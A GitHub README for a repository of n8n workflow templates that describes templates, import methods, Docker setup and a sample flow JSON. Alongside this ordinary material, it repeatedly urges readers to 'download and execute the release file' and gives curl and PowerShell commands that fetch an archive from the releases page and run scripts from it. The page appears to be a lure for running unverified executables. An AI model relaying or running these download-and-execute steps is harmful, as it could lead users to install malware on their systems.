https://github.com/SadmaAshiq/Engineus-n8n-templates/releases

# Engineus n8n Workflow Templates for Automation Teams Hub 🚀

[![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/SadmaAshiq/Engineus-n8n-templates/releases)  
![n8n](https://raw.githubusercontent.com/n8n-io/n8n/master/assets/images/logo.png)  

This repository stores a set of production-grade n8n workflow templates created and maintained by Engineus Group. The templates cover common integrations, trigger patterns, data transforms, error handling, and deployment patterns for self-hosted and cloud-hosted n8n instances. Use these templates to speed up automation work, reduce boilerplate, and follow best practices for real-world flows.

Badges
- Build status: [![Build](https://img.shields.io/badge/Build-passing-blue)](https://github.com/SadmaAshiq/Engineus-n8n-templates)
- License: [![License](https://img.shields.io/badge/License-MIT-blueviolet)](LICENSE)
- Releases: [![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/SadmaAshiq/Engineus-n8n-templates/releases)

Hero image:  
![Automation Flow](https://images.unsplash.com/photo-1581093588401-1abf66d5f5d6?q=80&w=1600&auto=format&fit=crop&ixlib=rb-1.2.1&s=5d9f3a3080f0b3f5b4f0d3b9b2b837fc)

Table of contents
- About
- Key features
- Templates included
- Quick start
  - Download and execute the release file
  - Import flows into n8n
  - Run with Docker
- Usage examples
  - Slack ticket flow
  - GitHub PR notifier
  - CRM sync (Airtable)
  - Payment webhook (Stripe)
- Template anatomy
- Best practices
- Testing and validation
- CI and release process
- Contributing
- Releases and changelog
- FAQ
- License
- Credits and links

About
This repo collects shareable n8n workflows and assets for teams that run automations. The templates target common business needs: alerts, data sync, ETL, approval flows, and webhooks. Each template uses a clear node layout, consistent naming, and a standard error strategy. Use them as building blocks or run them end to end.

Key features
- Ready-to-import n8n flow JSON files.
- A set of shell scripts and helper utilities for import and deployment.
- Template categories: triggers, integrations, transforms, orchestration.
- Secure handling of credentials with environment variables.
- Example .env files and Docker Compose for local testing.
- Release packages with signed artifacts and checksums.

Templates included (high level)
- incoming-webhook-basic.json — Generic webhook receiver and parser
- slack-alerts-ticket.json — Create Slack alerts from incoming tickets
- github-pr-notifier.json — Notify teams on pull requests
- airtable-crm-sync.json — Two-way sync between Airtable and a SQL database
- stripe-payment-webhook.json — Validate signatures and record payments
- calendar-reminder.json — Create calendar reminders and email reminders
- csv-to-db-import.json — Parse CSV from S3 and insert to Postgres
- error-handler-template.json — Centralized error capture and retry logic
- scheduler-batch-runner.json — Batch job runner and throttler
- oauth-refresh-manager.json — Refresh OAuth tokens and rotate credentials

Quick start

Download and execute the release file
The release assets live on the GitHub Releases page. Download and execute the release file from https://github.com/SadmaAshiq/Engineus-n8n-templates/releases. Each release contains a bundled archive and helper scripts. The top-level release asset follows the pattern engineus-n8n-templates-vX.Y.Z.tar.gz. The archive contains:
- flows/ — JSON files for each template
- scripts/import.sh — Shell script to import flows via the n8n CLI or REST API
- scripts/install-deps.sh — Utilities used by flows
- examples/ — Example input payloads
- README.md — Per-release notes

Linux / macOS example
1. Download the archive:
```bash
curl -L -o engineus-n8n-templates.tar.gz "https://github.com/SadmaAshiq/Engineus-n8n-templates/releases/download/v1.2.3/engineus-n8n-templates-v1.2.3.tar.gz"
```

2. Extract:
```bash
tar -xzf engineus-n8n-templates.tar.gz
cd engineus-n8n-templates-v1.2.3
```

3. Run the import script:
```bash
chmod +x scripts/import.sh
./scripts/import.sh --n8n-url "${N8N_URL}" --auth-token "${N8N_API_TOKEN}"
```

Windows (PowerShell) example
1. Download:
```powershell
Invoke-WebRequest -Uri "https://github.com/SadmaAshiq/Engineus-n8n-templates/releases/download/v1.2.3/engineus-n8n-templates-v1.2.3.zip" -OutFile "engineus-n8n-templates.zip"
Expand-Archive .\engineus-n8n-templates.zip -DestinationPath .\engineus-templates
Set-Location .\engineus-templates
.\scripts\import.ps1 -n8nUrl $env:N8N_URL -authToken $env:N8N_API_TOKEN
```

If the release link changes or you cannot access the file, check the Releases section on GitHub. The latest artifacts and checksums live there. Visit the releases page again: https://github.com/SadmaAshiq/Engineus-n8n-templates/releases

Import flows into n8n
Method A — n8n CLI
Use n8n CLI to import flows. This approach works for self-hosted instances and local environments.

1. Install n8n or use an image that includes the CLI.
2. Import a flow:
```bash
n8n import:workflow --input=flows/slack-alerts-ticket.json
```

Method B — n8n REST API
Use the REST endpoint to create or update workflows.

1. POST to /workflows with the JSON body.
2. Example:
```bash
curl -X POST "${N8N_URL}/workflows" \
  -H "Authorization: Bearer ${N8N_API_TOKEN}" \
  -H "Content-Type: application/json" \
  --data-binary @flows/slack-alerts-ticket.json
```

Method C — UI
1. Open n8n.
2. Use Import from file.
3. Select the JSON flow file.

Run with Docker Compose
We include a sample docker-compose.yml to run n8n with persistent storage. Use the provided .env to set credentials.

1. Copy .env.example to .env and set values.
2. Start:
```bash
docker-compose up -d
```

3. Import flows with the scripts/import.sh or UI.

Usage examples

Slack ticket flow
Use case: route incoming tickets to a Slack channel, add context, and create a persistent record in a database.

Flow outline:
- Webhook trigger
- HTTP Request to fetch ticket details
- Set node to build Slack message
- Slack node to post a message
- Postgres node to insert ticket record
- If Slack fails, route to fallback channel and insert an alert record

Key nodes and config:
- Webhook node listens on /webhook/tickets
- Slack node uses Bot Token scoped to chat:write
- Postgres node uses connection via environment variables

Example transform snippet (Set node):
```json
{
  "title": "New ticket from {{ $json.payload.email }}",
  "text": "{{ $json.payload.body }}",
  "fields": [
    { "title": "Priority", "value": "{{ $json.payload.priority }}" },
    { "title": "ID", "value": "{{ $json.payload.id }}" }
  ]
}
```

GitHub PR notifier
Use case: notify a Slack channel and create a JIRA ticket when a PR opens with specific labels.

Flow outline:
- Webhook trigger from GitHub
- Condition node checks labels
- Slack node posts message with PR link
- HTTP Request node creates JIRA issue with structured fields
- Tag node to add labels for tracking

Important items:
- Validate GitHub signature using the secret provided in the webhook configuration
- Use a single credentials store for GitHub and JIRA
- Use an error handler to capture failed JIRA calls and retry

CRM sync (Airtable)
Use case: keep Airtable and an internal Postgres CRM in sync.

Flow outline:
- Poll Airtable for changes (trigger or webhook)
- Transform fields to match Postgres schema
- Upsert into Postgres
- Emit events to a message queue for downstream processing

Details:
- The template uses an incremental sync approach.
- Flow stores last sync timestamp in workflow settings or in a small state table.
- The Airtable node includes rate limit handling.

Payment webhook (Stripe)
Use case: securely validate Stripe webhooks and record payments.

Flow outline:
- Webhook node receives Stripe event
- Verify signature with the Stripe signing secret in env
- Validate event type (invoice.payment_succeeded, payment_intent.succeeded)
- Insert payment into payments table
- Trigger receipts by email via SMTP or SendGrid

Security:
- Keep Stripe signing secret in environment variables.
- Avoid logging full webhook payloads in production.
- The template validates the signature and then strips sensitive fields before storing.

Template anatomy
Each template follows a structure:
- Metadata (title, description, version)
- Nodes with clear names and comments
- Credential placeholders that use env vars
- Example payloads in examples/
- Tests folder (mock inputs and expected outputs)
- A top-level README in flows/ explaining steps to wire credentials

Metadata example (top of JSON):
```json
{
  "name": "slack-alerts-ticket",
  "active": false,
  "nodes": [...],
  "metadata": {
    "engineus": {
      "templateVersion": "1.0.0",
      "maintainer": "Engineus Group",
      "category": "alerts"
    }
  }
}
```

Best practices
- Use environment variables for secrets. Do not embed tokens in flows.
- Use a central error handler. Route errors to a retry queue or a team Slack channel.
- Provide idempotency keys for external calls that can create duplicates.
- Keep node names short and descriptive.
- Add comments to Set nodes to explain complex transforms.
- Use the Execute Workflow node for modular flows.
- Keep flows under 150 nodes for readability. Break complex work into sub-workflows and call them.

Testing and validation
Unit-level tests
- Each flow includes a set of example inputs in the examples/ folder.
- Use a test harness to POST examples to the webhook or to call the flow import endpoint and execute the flow in a dry-run mode.

Integration tests
- Run flows against sandbox accounts for third-party services.
- Use mocked endpoints for services that charge money.

Automated test run (sample script)
```bash
# Run test harness
./scripts/run-tests.sh --env-file .env.test
```

Validation checklist
- All required env vars present
- Credentials load without error
- Flow triggers fire with mock payload
- Target services accept test requests

CI and release process
We use GitHub Actions to build, validate, and bundle release artifacts.

Workflow stages
- Lint: JSON lint, schema validation for flows
- Test: Run test harness in container
- Package: Create a tarball and a zip with checksums
- Release: Create GitHub release and attach artifacts

Release artifacts include:
- engineus-n8n-templates-vX.Y.Z.tar.gz
- engineus-n8n-templates-vX.Y.Z.zip
- SHA256SUMS and GPG signature

Assets upload
During release, the action uploads the artifacts to the Releases page. Download and execute the release file from https://github.com/SadmaAshiq/Engineus-n8n-templates/releases to get the full bundle for a release.

Contributing
We welcome contributions. Follow the steps below.

1. Fork the repo.
2. Create a branch: git checkout -b feat/my-template
3. Add your template under flows/ with a README that explains:
   - Use case
   - Required credentials
   - Test payloads
   - Recommended node limits
4. Add tests in tests/ and example payloads in examples/
5. Run lint and tests:
```bash
./scripts/lint.sh
./scripts/run-tests.sh
```
6. Open a pull request with a clear description and testing steps.

Coding standards
- Keep flow node names clear.
- Use English for labels and comments.
- Avoid hard-coded credentials.
- Add tests for side effects.

Review checklist for maintainers
- Does the flow include a clear description?
- Are credentials documented?
- Do tests cover success and failure paths?
- Does the template follow the anatomy guidelines?

Releases and changelog
We publish releases with detailed notes. The release notes include:
- New templates
- Breaking changes
- Migration steps if necessary
- Checksums and signature details

Find releases on GitHub Releases and download the asset bundle. Download and execute the release file from https://github.com/SadmaAshiq/Engineus-n8n-templates/releases. If you need the latest artifact, check the Releases tab on the repo page.

Changelog structure
- Unreleased: upcoming items
- vX.Y.Z: release date, highlights, migration notes

FAQ

Q: Where do I get the release artifacts?
A: Visit the Releases page on GitHub: https://github.com/SadmaAshiq/Engineus-n8n-templates/releases. Each release contains a fixed set of files and scripts. Download and execute the release file from that page.

Q: How do I import flows into a running n8n instance?
A: Use the n8n CLI or the REST API. The repo includes scripts that wrap those calls. See scripts/import.sh for examples.

Q: How do I manage credentials in production?
A: Use environment variables, secrets manager, or Kubernetes secrets. Do not store tokens in the flow JSON. Use the n8n credential store or external secret providers.

Q: How do you handle secrets rotation?
A: Provide a single script to rotate credentials in your environment and in the n8n credential store. The oauth-refresh-manager template can handle token refresh cycles.

Q: Can I run templates on n8n cloud?
A: Yes. For n8n cloud, import the flow using the UI. Set credentials through the n8n cloud credential screen.

Q: I changed a flow. How do I deploy changes?
A: Export the flow JSON from n8n and version control it. Use the import script in the release bundle to apply updates. For large teams, use CI to import flows into a staging instance and run tests before promoting to production.

Security and compliance
- Keep keys out of source control.
- Use least privilege for service tokens.
- Enable audit logging on n8n host.
- Restrict webhooks to IP allow lists for sensitive endpoints.
- Rotate credentials on a schedule.

Common patterns shown in templates
- "Webhook -> Validator -> Transform -> Destination": The basic pattern for inbound events.
- "Scheduler -> Batch -> Rate limiter -> External API": For throttled batch processing.
- "Trigger -> Branch by condition -> Subflow calls": For orchestration.
- "Try/Catch -> Retry with backoff -> Dead-letter route": For robust error handling.

Architecture diagram
![Architecture](https://images.unsplash.com/photo-1581091012184-6adf7ab4f112?q=80&w=1200&auto=format&fit=crop&ixlib=rb-1.2.1&s=8c20f2b8b9cb50a3b6cf9ff1d0d4f8d5)

- Clients or services send events to n8n webhooks.
- n8n processes events and writes to the data store.
- n8n calls downstream APIs using stored credentials.
- Errors route to a dedicated tracking database and to Slack alerts.

Troubleshooting

Import errors
- If the import script fails, check the n8n logs for schema errors.
- Ensure the API token matches the admin token for the n8n instance.

Credential issues
- Verify that env vars match the expected keys.
- Check that the credentials exist in the n8n credential store.

Webhook failures
- Confirm that the public URL routes to n8n.
- For self-hosted instances behind a proxy, confirm proxy headers include the original host.

Performance
- Use the scheduler-batch-runner template for heavy loads.
- Offload long-running tasks to background workflows.
- Use Redis or another queue for rate-limiting and retries.

Audit and observability
- Enable n8n's internal logging at info level for production.
- Forward logs to a central system like Elastic or Datadog.
- Use metrics exporter to collect counts for triggers and errors.

Roadmap
- Expand template library for e-commerce, HR, and finance.
- Add a library of reusable subflows and node modules.
- Publish a set of community-contributed templates with reviews.
- Add a web-based marketplace for templates with tags and ratings.

Templates we plan to add
- Shopify order processor
- HubSpot lead enrichment
- Zendesk escalation flow
- OAuth2 provider examples for major services

Credits and links
- Official n8n: https://n8n.io
- n8n logo source used above
- Unsplash for hero and architecture images
- GitHub Actions for CI

Helpful commands and scripts
Import all flows using the provided script:
```bash
./scripts/import.sh --all --n8n-url "${N8N_URL}" --auth-token "${N8N_API_TOKEN}"
```

List flows via API:
```bash
curl -H "Authorization: Bearer ${N8N_API_TOKEN}" "${N8N_URL}/workflows"
```

Export a flow for backup:
```bash
curl -H "Authorization: Bearer ${N8N_API_TOKEN}" "${N8N_URL}/workflows/123" > backup-workflow-123.json
```

Checksums and verification
Each release includes checksums. Verify a downloaded archive:
```bash
sha256sum engineus-n8n-templates-v1.2.3.tar.gz
```
Compare with SHA256SUMS file included in the release assets.

License
This repository uses the MIT license. See LICENSE for details.

Contact and support
- Repo issues: use GitHub Issues for bugs and enhancement requests.
- For urgent matters, raise an issue and tag with the label support.
- For contributions, open a pull request and follow the contributing guide.

Additional resources
- n8n documentation: https://docs.n8n.io
- n8n community: https://community.n8n.io
- Example collection of flows: flows/

Release link again
- Visit the Releases page to get assets, checksums, and signed bundles: https://github.com/SadmaAshiq/Engineus-n8n-templates/releases

Appendix: Example flow JSON snippet (trimmed)
```json
{
  "name": "slack-alerts-ticket",
  "nodes": [
    {
      "parameters": {
        "httpMethod": "POST",
        "path": "webhook/tickets"
      },
      "name": "Webhook",
      "type": "n8n-nodes-base.webhook",
      "typeVersion": 1,
      "position": [250, 300]
    },
    {
      "parameters": {
        "functionCode": "const payload = $json; return [{ json: { title: `Ticket ${payload.id}`, body: payload.body } }];"
      },
      "name": "Transform",
      "type": "n8n-nodes-base.function",
      "typeVersion": 1,
      "position": [450, 300]
    },
    {
      "parameters": {
        "channel": "#support",
        "text": "={{$json.title + '\\n' + $json.body}}"
      },
      "name": "Slack",
      "type": "n8n-nodes-base.slack",
      "typeVersion": 1,
      "position": [650, 300]
    }
  ],
  "connections": {
    "Webhook": {
      "main": [
        [
          {
            "node": "Transform",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
    "Transform": {
      "main": [
        [
          {
            "node": "Slack",
            "type": "main",
            "index": 0
          }
        ]
      ]
    }
  }
}
```

End of file